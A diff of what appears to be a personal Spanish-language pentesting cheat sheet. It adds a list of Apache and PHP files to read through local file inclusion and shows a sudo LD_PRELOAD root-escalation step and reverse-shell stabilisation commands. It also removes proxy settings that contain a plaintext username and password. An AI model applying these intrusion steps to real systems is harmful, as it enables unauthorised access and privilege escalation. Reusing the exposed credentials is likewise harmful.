@@ -114,6 +114,13 @@ www-data@host:/$ export SHELL=bash
 ~$> ssty size
 www-data@host:/$ stty rows 40 columns 123
 
+#################################[enumeracion de apache LFI]#######################################################
+/etc/apache2/sites-available/000-default.conf #sudominios
+/var/log/apache2/error.log                    #logs de error
+/var/log/apache2/access.log                   #logs de acceso
+/etc/php5/apache2/php.ini                     #
+
+
 ######################################[URL CODE]############################################################################
 ' ' = %20
 ';' = %3b
@@ -148,46 +155,3 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so find
 
 
-######################[PROXY A NIVEL DE SISTEMA]##########################################
-#```sh
-   sudo nano /etc/apt/apt.conf.d/95proxies
-   ```
-
-2. **Agregar la configuración del proxy**:
-
-   Añade las siguientes líneas al archivo para configurar el proxy con las credenciales proporcionadas:
-
-   ```plaintext
-   Acquire::http::proxy "http://davidg:golal90@10.0.0.1:8080/";
-   Acquire::https::proxy "http://davidg:golal90@10.0.0.1:8080/";
-   ```
-
-
- ```sh
-   sudo nano /etc/environment
-   ```
-
-2. **Agregar las variables de entorno del proxy**:
-
-   Añade las siguientes líneas al archivo para configurar las variables de entorno del proxy:
-
-   ```plaintext
-   http_proxy="http://davidg:golal90@10.0.0.1:8080/"
-   https_proxy="http://davidg:golal90@10.0.0.1:8080/"
-   ftp_proxy="http://davidg:golal90@10.0.0.1:8080/"
-   no_proxy="localhost,127.0.0.1,::1"
-   ```
-
-```sh
-   sudo nano /etc/wgetrc
-   ```
-
-2. **Agregar la configuración del proxy**:
-
-   Añade las siguientes líneas para configurar el proxy:
-
-   ```plaintext
-   use_proxy = on
-   http_proxy = http://davidg:golal90@10.0.0.1:8080/
-   https_proxy = http://davidg:golal90@10.0.0.1:8080/
-   ```
